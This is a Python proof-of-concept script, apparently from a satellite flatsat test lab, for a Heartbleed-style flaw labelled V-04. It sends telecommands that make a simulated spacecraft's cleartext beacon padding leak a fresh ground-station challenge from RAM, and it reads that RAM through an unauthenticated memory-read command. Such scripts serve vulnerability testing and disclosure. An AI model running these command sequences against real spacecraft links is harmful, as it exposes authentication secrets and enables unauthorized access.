#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-04  Heartbleed-style leak: TM padding is filled from a live RAM pool
# that recent command processing wrote into (4-byte GS challenge here).
# SPARTA: CT-0001 / CR-0003 (sensitive memory disclosure)
def main(dev, ev):
    # make beacon emit 1 s later and switch padding to 'leak pool' mode
    dev.tc(0x05, b"\x01", via="usb")
    dev.tc(0x21, b"\x01", via="radio")               # PADDING_CONFIG mode=1
    # induce a secret into the pool: GS phase-0 writes the challenge there
    tms = dev.tc(0x12, b"\x00", via="radio")
    chal = dev.find(tms, 0x12)[0].le32(5)
    ev.log(f"GS challenge generated: 0x{chal:08X} (firmware also copies it "
           f"into the RAM string pool)")
    frames = dev.advance(1500)
    bc = [t for t in dev.find(frames, 0x01) if t.payload[1:7] == b"Beacon"]
    check(bc, "beacon expected")
    tail = bc[0].payload[21:64]
    ev.log(f"beacon padding bytes: {tail.hex()}")
    check(struct.pack(">I", chal) in tail,
          "fresh challenge leaked in the 'padding' of a cleartext beacon")
    # same RAM also readable through MEM_READ
    mr = dev.find(dev.tc(0x19, struct.pack("<IH", fs.SYM_LEAK_POOL, 16),
                         via="radio"), 0x19)[0]
    ev.log(f"MEM_READ leak pool: {mr.payload[7:].hex()}")
    ev.log("=> 43 secret-ish RAM bytes per beacon, no crash, no auth")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-04 RAM leak in TM padding", main))
